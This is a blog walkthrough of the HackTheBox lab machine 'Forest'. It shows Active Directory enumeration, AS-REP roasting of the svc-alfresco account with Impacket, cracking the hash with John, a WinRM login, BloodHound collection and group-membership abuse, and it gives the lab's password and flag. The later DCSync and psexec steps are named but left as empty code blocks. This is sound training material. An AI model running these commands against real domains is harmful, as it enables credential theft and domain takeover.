---
layout: post
title: Hackthebox Forest Walkthrough
categories: HackTheBox
---

![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-06-10/forest.png)

# Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
This is a walkthrough of a box `Forest`.

# Solution
## 1. Initial Enumeration
### TCP Port Scanning:
```shell
root@kali:~# nmap -p- 10.10.10.161 -sV -sC
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-08 15:17 EEST
Nmap scan report for 10.10.10.161
Host is up (0.042s latency).
Not shown: 65512 closed ports
PORT      STATE SERVICE      VERSION
53/tcp    open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-06-08 12:32:29Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf       .NET Message Framing
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
49706/tcp open  msrpc        Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=6/8%Time=5EDE2CA8%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h33m47s, deviation: 4h02m31s, median: 13m45s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2020-06-08T05:34:49-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-06-08T12:34:50
|_  start_date: 2020-06-08T12:30:19

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 330.01 seconds
```

### User enumeration
```shell
root@kali:~# rpcclient 10.10.10.161 -U "" -N
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $>
```

### Group enumeration
```shell
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[Key Admins] rid:[0x20e]
group:[Enterprise Key Admins] rid:[0x20f]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Organization Management] rid:[0x450]
group:[Recipient Management] rid:[0x451]
group:[View-Only Organization Management] rid:[0x452]
group:[Public Folder Management] rid:[0x453]
group:[UM Management] rid:[0x454]
group:[Help Desk] rid:[0x455]
group:[Records Management] rid:[0x456]
group:[Discovery Management] rid:[0x457]
group:[Server Management] rid:[0x458]
group:[Delegated Setup] rid:[0x459]
group:[Hygiene Management] rid:[0x45a]
group:[Compliance Management] rid:[0x45b]
group:[Security Reader] rid:[0x45c]
group:[Security Administrator] rid:[0x45d]
group:[Exchange Servers] rid:[0x45e]
group:[Exchange Trusted Subsystem] rid:[0x45f]
group:[Managed Availability Servers] rid:[0x460]
group:[Exchange Windows Permissions] rid:[0x461]
group:[ExchangeLegacyInterop] rid:[0x462]
group:[$D31000-NSEL5BRJ63V7] rid:[0x46d]
group:[Service Accounts] rid:[0x47c]
group:[Privileged IT Accounts] rid:[0x47d]
group:[test] rid:[0x13ed]
rpcclient $> 
```

### SMB enumeration
```shell
root@kali:~# smbclient -L 10.10.10.161
Enter WORKGROUP\root's password: 
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

### LDAP enumeration
```shell
root@kali:~# ldapsearch -h 10.10.10.161 -p 389 -x -b "dc=htb,dc=local"

# -x for anonymous auth, -b for basedn to start from

---

```

## 2. Getting User

This is the list of user on the domain.
```shell
root@kali:~# cat users.txt 
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

Next, look for user accounts that do not have the property 'Do not require Kerberos preauthentication' (`UF_DONT_REQUIRE_PREAUTH`) set.<br>
This attack is called [AS-REP Roasting](https://blog.stealthbits.com/cracking-active-directory-passwords-with-as-rep-roasting/).<br>
Pre-authentication is needed for the issue of TGT ticket during the Kerberos authentication. If it's disabled, DC would provide an encrypted TGT that can be cracked offline when requested.<br>
We can use `GetNPUsers.py` in [Impacket](https://github.com/SecureAuthCorp/impacket) to implement this attack.
```shell
root@kali:~# python impacket/examples/GetNPUsers.py -format john -no-pass -usersfile ./users.txt -dc-ip 10.10.10.161 htb.local/
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$svc-alfresco@HTB.LOCAL:6af93fd6240b0fefd6d873241b5d352c$6832d233ac0a0c1368ec9200b2444865ade034b1429891463c299c7867711a22f29685d2db22168302a9c2452db13faf64a81bbd6817822c4416416d3abdcc2a0d34815ba984ce8402f00011a993d7a4945ff8c9a2ebbc7bfa660c5197f571788f60702edd25cd4613ce79c0ca60c1ad31715d485a3b31b11641cc29e0be312455f698203f0e679d0c21cd900b436bfceaf1a21629408c0e0e104b7ab2e6d2bcfe0bc613fd118fce806f7985ea778f08c0e0060b6c618b83b78cced44f989bcfa0d3af6e191b324297b5701114b4c67266aaa56ea9a825a61a73b3b75d89d18d8c70b0ddc115
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] invalid principal syntax
```

We found a hash for the user `svc-alfresco`.
```shell
$krb5asrep$svc-alfresco@HTB.LOCAL:6af93fd6240b0fefd6d873241b5d352c$6832d233ac0a0c1368ec9200b2444865ade034b1429891463c299c7867711a22f29685d2db22168302a9c2452db13faf64a81bbd6817822c4416416d3abdcc2a0d34815ba984ce8402f00011a993d7a4945ff8c9a2ebbc7bfa660c5197f571788f60702edd25cd4613ce79c0ca60c1ad31715d485a3b31b11641cc29e0be312455f698203f0e679d0c21cd900b436bfceaf1a21629408c0e0e104b7ab2e6d2bcfe0bc613fd118fce806f7985ea778f08c0e0060b6c618b83b78cced44f989bcfa0d3af6e191b324297b5701114b4c67266aaa56ea9a825a61a73b3b75d89d18d8c70b0ddc115
```

Since we had `-format john` option for `GetNPUsers.py`, we can crack the hash with `John the Ripper`.
```shell
root@kali:~# cat hash.txt 
$krb5asrep$svc-alfresco@HTB.LOCAL:6af93fd6240b0fefd6d873241b5d352c$6832d233ac0a0c1368ec9200b2444865ade034b1429891463c299c7867711a22f29685d2db22168302a9c2452db13faf64a81bbd6817822c4416416d3abdcc2a0d34815ba984ce8402f00011a993d7a4945ff8c9a2ebbc7bfa660c5197f571788f60702edd25cd4613ce79c0ca60c1ad31715d485a3b31b11641cc29e0be312455f698203f0e679d0c21cd900b436bfceaf1a21629408c0e0e104b7ab2e6d2bcfe0bc613fd118fce806f7985ea778f08c0e0060b6c618b83b78cced44f989bcfa0d3af6e191b324297b5701114b4c67266aaa56ea9a825a61a73b3b75d89d18d8c70b0ddc115
```
```shell
root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)
1g 0:00:00:02 DONE (2020-06-08 18:35) 0.3521g/s 1438Kp/s 1438Kc/s 1438KC/s s521379846..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Now we have an user credential for `svc-alfresco`.
```shell
svc-alfresco:s3rvice
```

As port 5985 is open for `WinRM`, we can use [evil-WinRM](https://github.com/Hackplayers/evil-winrm) to login as the user `svc-alfresco`.<br>
`user.txt` is in the directory `C:\Users\svc-alfresco\Desktop`.
```shell
root@kali:~/evil-winrm# ./evil-winrm.rb -i 10.10.10.161 -u svc-alfresco -p s3rvice

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> type C:\Users\svc-alfresco\Desktop\user.txt
e5e4e47ae7022664cda6eb013fb0d9ed
```

## 3. Getting Root

To investigate a specific domain, we can use `bloodhound`.<br>
We can install it by using `pip install bloodhound` command.<br>

### Setting up bloodhound GUI
I don't talk about it since it can be so lengthy!!<br>
[Useful link](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux)

### Analyzing the forest
#### 1. Clone Bloodhound repository
```shell
root@kali:~# git clone https://github.com/BloodHoundAD/BloodHound.git
```

#### 2. Collecting domain information with SharpHound.ps1
```shell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload /root/BloodHound/Ingestors/SharpHound.ps1
Info: Uploading /root/BloodHound/Ingestors/SharpHound.ps1 to C:\Users\svc-alfresco\Documents\SharpHound.ps1

                                                             
Data: 1297080 bytes of 1297080 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/8/2020   1:40 PM         972811 SharpHound.ps1


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-module ./SharpHound.ps1
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -CollectionMethod ACL,ObjectProps,Default -CompressData -RemoveCSV -NoSaveCache
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/8/2020   1:42 PM          15234 20200608134233_BloodHound.zip
-a----         6/8/2020   1:40 PM         972811 SharpHound.ps1


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20200608134233_BloodHound.zip
Info: Downloading C:\Users\svc-alfresco\Documents\20200608134233_BloodHound.zip to 20200608134233_BloodHound.zip

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> exit

Info: Exiting with code 0

root@kali:~/evil-winrm# ls
20200608134233_BloodHound.zip  CONTRIBUTING.md  Gemfile       README.md
CHANGELOG.md                   Dockerfile       Gemfile.lock  resources
CODE_OF_CONDUCT.md             evil-winrm.rb    LICENSE
```

#### 3. Data import to Bloodhound
You can just drag/drop the zip file you downloaded or 'Upload data' menu on the right side of BloodHound.

#### 4. Find a shortest way to Admin Users


### Exploitation
To get administrator account, put create a new user and put into `Exchange Windows Permissions` group and `Remote Management Users` group.
```shell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" inar1 /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net localgroup "Remote Management Users" inar1 /add
The command completed successfully.

```
```shell
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user inar1
User name                    inar1
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/9/2020 9:31:54 PM
Password expires             7/21/2020 9:31:54 PM
Password changeable          6/10/2020 9:31:54 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.

```

Next, download [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) and upload it to the target server.
```shell
```

According to `abuse info` on the BloodHound, give `DCSync` right for copying the DC to `svc-alfresco`.
```shell

```

After that, we can use `secretdump.py` in the `Impacket` to dump the password hash for `administrator`.
```shell

```

The domain admin hash can be used to login using `psexec.py`.
```shell

```

`root.txt` is in the directory `C:\Users\administrator\desktop`.
```shell

```
